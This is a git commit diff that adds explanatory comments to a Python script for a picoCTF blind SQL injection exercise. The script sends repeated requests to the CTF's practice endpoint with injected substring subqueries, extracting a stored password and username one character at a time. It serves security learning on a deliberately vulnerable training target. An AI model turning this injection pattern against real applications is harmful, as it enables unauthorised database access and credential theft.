450a1637b7854fc99e8d18ac5e9d39f163303c24
Colston <bodoycolstond@gmail.com>
2024-06-12 21:39:13 +0800

    updated comments

--- sql_injection_example/script.py
+++ sql_injection_example/script.py
@@ -8,7 +8,10 @@ accum = ""
 for i in range(1, 41):
     for letter in printable:
         accum += letter
-
+        
+        # We first cast the password field to a binary string before extracting the substring
+        # to ensure that the comparison is done byte by byte, which can be important for 
+        # case sensitivity and encoding issues
         r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
         + letter +"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
 
@@ -24,7 +27,9 @@ accum2 = ""
 for i in range(1, 8):
     for letter in printable:
         accum2 += letter
-
+        
+        # Same as the injection for password but we replaced the password field 
+        # with the username field
         r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
         + letter +"'=( select substr(binary username,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
 
